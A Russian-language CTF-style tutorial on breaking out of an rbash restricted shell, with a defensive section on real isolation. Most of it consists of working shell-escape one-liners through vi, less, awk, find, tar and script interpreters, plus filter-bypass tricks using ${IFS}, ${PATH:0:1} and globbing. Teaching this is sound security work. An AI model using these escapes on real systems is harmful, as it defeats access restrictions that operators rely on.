## Вопрос, с которого всё начинается

Задача даёт SSH-доступ: логин `player`, пароль известен. Заходим — и оболочка ведёт себя странно: `cd` отвечает `cd: restricted`, `/bin/ls` не запускается. Это **restricted shell** — оболочка с отключёнными опасными возможностями. Как из неё выбраться?

## Наш пример: SSH в rbash

Подключаемся и сразу изучаем окружение:

```
$ echo $SHELL
/bin/rbash
$ echo $PATH
/usr/local/rbash/bin
$ cd /
rbash: cd: restricted
```

`rbash` (restricted bash) отключил смену директории, запуск команд по абсолютному пути, изменение `PATH` и перенаправления. Переменная `PATH` указывает на единственный каталог — там лежат только «разрешённые» программы. Смотрим, что именно разрешено:

```
$ ls /usr/local/rbash/bin
vi  awk  less
```

Три программы. Уже хорошая зацепка: каждая из них умеет запускать другие команды. В этом и суть побега.

## Шаг 1: почему restricted shell — не защита

Ключевая мысль: `rbash` ограничивает только то, как **сам shell** разбирает команды. Но он не ограничивает программы, которые shell запускает. Как только вы запускаете любую программу, умеющую выполнить команду, вы получаете полноценный доступ.

Каталог GTFOBins (gtfobins.github.io) — это каталог именно таких программ. Почти каждая утилита с «швейцарским ножом» внутри (`vi`, `less`, `awk`, `find`, `tar`, `man`) даёт побег. Настоящая изоляция требует ограничений ОС (chroot, отдельный пользователь, seccomp), а не урезанного shell.

## Шаг 2: побег через редактор

Наш `vi` — классический путь. Запускаем:

```
$ vi
```

Внутри `vi` выполняем команду оболочки через `:!`:

```
:!/bin/sh
```

Если сработало — мы в обычном shell, ограничения сняты. У `vi` есть и другие выходы: `:set shell=/bin/sh`, затем `:shell`, или `:python3 import os; os.system('/bin/sh')`, если `vi` собран с Python.

`ed` — редактор попроще — тоже умеет: `!/bin/sh`.

## Шаг 3: побег через pager и awk

Если `vi` недоступен, пробуем `less`. Запускаем любой файл:

```
$ less /etc/hostname
```

и жмём `!sh` — `less` запускает shell.

Наш `awk` — ещё проще. Выполняем команду прямо в `BEGIN`:

```
$ awk 'BEGIN{system("/bin/sh")}'
```

Это открывает полноценный shell. То же делают `find` (`find . -exec /bin/sh \;`), `tar` (`--checkpoint-action=exec=/bin/sh`), `man` (через pager `!sh`).

## Шаг 4: обход фильтров символов

Иногда джейл запрещает не только команды, но и символы. Разберём два частых случая.

**Запрещён пробел.** Вместо него подставляем `${IFS}` — встроенную переменную-разделитель:

```
$ cat${IFS}/flag
```

**Запрещён слэш `/`.** Берём его из переменной `PATH` — первый символ пути обычно `/`:

```
$ cat ${PATH:0:1}flag
```

`${PATH:0:1}` означает «символ с позиции 0 длиной 1». Так `/` появляется, не будучи напечатанным. Оба приёма комбинируются:

```
$ cat${IFS}${PATH:0:1}flag
```

**Запрещены точные имена.** Используем globbing — `?` совпадает с любым символом:

```
$ /???/??t /????
```

`/???/??t` раскрывается в `/bin/cat`, а `/????` — в `/flag`. Оболочка подставляет символы сама, фильтр их не видит.

## Шаг 5: если в PATH есть интерпретатор

Самый частый побег — разработчик забыл убрать из `PATH` язык программирования. Тогда всё тривиально:

```
$ python3 -c 'import os; os.system("/bin/sh")'
$ perl -e 'exec "/bin/sh"'
$ ruby -e 'exec "/bin/sh"'
$ node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
```

Любой из этих однострочников даёт shell. Поэтому первым делом после инвентаризации `PATH` ищите интерпретаторы.

## Шаг 6: если не сработало

- **`PATH` пуст.** Используйте `${PATH:0:1}` от другой переменной или globbing.
- **Нет ни одной «опасной» программы.** Почти невозможно: shell требует утилит, и почти каждая имеет escape.
- **Запрещён `cd`, а нужна другая директория.** Возьмите программу со сменой директории: `tar -C`, `find`.
- **`vi` в restricted mode (`rvim`).** `:!` и `:shell` отключены, но `:python`/`:lua` и `:r file` могут остаться.
- **Не помните, что доступно.** Сверяйтесь с GTFOBins по имени программы.

## Шаг 7: полный прогон

Соберём побег в одну последовательность:

1. `echo $SHELL` и `echo $PATH` — определяем, что это rbash и куда указывает PATH.
2. `cd /` — проверяем ограничение (получаем `cd: restricted`).
3. `ls $PATH` — выписываем доступные программы (`vi`, `awk`, `less`).
4. Выбираем самую «богатую» — `vi`, и запускаем `:!/bin/sh`.
5. Если не вышло — `awk 'BEGIN{system("/bin/sh")}'`, затем `less` + `!sh`.
6. Если фильтруются символы — подставляем `${IFS}` и `${PATH:0:1}`.
7. Внутри shell читаем флаг: `cat /flag`.

Каждый шаг — проверка одной гипотезы. Если программа не даёт shell, переходим к следующей, а не переписываем payload целиком.

## Шаг 8: чем на самом деле защищаются

Restricted shell — «защита» только на уровне интерпретатора команд. Настоящая изоляция — это ограничения ОС:

- запуск под отдельным непривилегированным пользователем;
- `chroot` или namespaces, чтобы не было доступа к файлам вне песочницы;
- `seccomp`, запрещающий `execve`;
- отсутствие интерпретаторов и «швейцарских ножей» в `PATH`.

Поэтому при аудите не полагайтесь на rbash: если в PATH осталась хоть одна программа с запуском команды, изоляции нет. Различайте «логический» джейл (ограничения shell/языка) и «системный» (seccomp/namespaces) — техники побега у них разные.

## Что мы теперь знаем

По-простому:

1. `rbash` ограничивает интерпретацию команд shell, но не запускаемые программы.
2. Побег идёт через любую программу, умеющую выполнить команду.
3. `vi` (`:!/bin/sh`), `less` (`!sh`), `awk` (`system("/bin/sh")`) — классика.
4. `${IFS}` обходит запрет пробела, `${PATH:0:1}` — запрет слэша, globbing — запрет имён.
5. Интерпретатор в `PATH` (python/perl/ruby/node) делает побег тривиальным.

## На что смотреть дальше

- **Не проверили `PATH`** — там может быть интерпретатор.
- **Забыли про pager** (`less`/`more`/`man`) — лёгкий побег.
- **Игнорируете GTFOBins** — почти каждая программа имеет escape.
- **Запрещены пробелы** — используйте `${IFS}`.
- **Запрещён `/`** — `${PATH:0:1}` или `?`.

## Справочник: побег из rbash

Restricted shell (`rbash`) запрещает смену директории, установку `PATH` и запуск программ с `/`. Побег почти всегда идёт через **интерактивную программу**, которая умеет запускать команды:

| Программа | Побег |
|---|---|
| `vi`/`vim` | `:!sh` или `:set shell=/bin/sh` |
| `less`/`more` | `!sh` |
| `man` | `!sh` |
| `awk` | `awk 'BEGIN{system("/bin/sh")}'` |
| `find` | `find . -exec /bin/sh \;` |
| `git` | `git -p help` → `!sh` |
| `scp`/`tar` | трюки с путями |
| `python`/`perl` | `os.system('sh')` |

Правило: **любая программа с «выполнить команду» или «открыть шелл» ломает rbash**. Поэтому `rbash` — это защита от случайной ошибки, а не от атакующего.

## Мини-практика: побег через awk

Пошагово, если в джейле оставили `awk`:

```
$ awk 'BEGIN{system("/bin/sh")}'
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

`system()` внутри `awk` запускает произвольную команду, а `/bin/sh` открывает полноценный шелл — ограничения rbash при этом не действуют, потому что новый шелл запущен уже вне restricted-режима.

## Частые ошибки

- **Думать, что rbash — безопасность.** Это ограничение удобства, а не изоляция.
- **Забыть про `PATH`.** Если в `PATH` есть интерпретатор, побег тривиален.
- **Не смотреть доступные бинарники.** `ls`/`compgen -c` покажет, что осталось.
- **Игнорировать `-exec`.** `find` с `-exec` запускает команды без отдельного шелла.

## Чем на самом деле защищаются

`rbash` — это ограничение удобства, а не безопасности. Реальная защита выглядит иначе:

- **Отдельный пользователь** без прав на чувствительные файлы.
- **Белый список команд** через `sudoers` или собственный launcher, а не restricted shell.
- **Нет интерпретаторов в `PATH`** — но полагаться только на это нельзя.
- **Read-only монтирования** и минимальные права на файлы.
- **Аудит и алерты** — побег из джейла должен быть заметен.

Правило: **если пользователю дали любой интерактивный инструмент с «выполнить команду», это уже шелл**. Ограничивай доступ, а не синтаксис.

## Шпаргалка: быстрый чек-лист побега

- `echo $SHELL` / `echo $PATH` — что доступно.
- `compgen -c` — список команд.
- `vi`, `less`, `man`, `awk`, `find` — ищи любую из них.
- `git -p help` / `scp` / `tar` — обходные пути.
- `python`, `perl`, `ruby` — если в `PATH`, побег тривиален.
- `man <любая>` → `!sh` — ещё один обход.
- Проверь `sudo -l` — вдруг что-то разрешено без пароля.
- `echo /*` — что видно в корне.
- `set` — нет ли подсказок в переменных окружения.

## Мини-практика: побег через vi

Если в джейле остался `vi`, этого достаточно:

```
$ vi
:set shell=/bin/sh
:shell
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

Две команды внутри редактора открывают полноценный шелл. Именно поэтому редактор, pager, `man`, `git`, `awk` и `find` считаются «эскалаторами» — каждый из них умеет запускать внешнюю команду, а значит ломает любой текстовый джейл.

## Куда дальше

Мы вышли из rbash через редактор и pager. Но джейлы бывают и на других языках: «выполните только awk-скрипт», «разрешён только sed». Дальше разберём каталог приёмов для awk, sed, vim, perl, ruby и Lua. А пока главное запомни: restricted shell ограничивает оболочку, а не систему, и любая программа с запуском команды снимает ограничения.
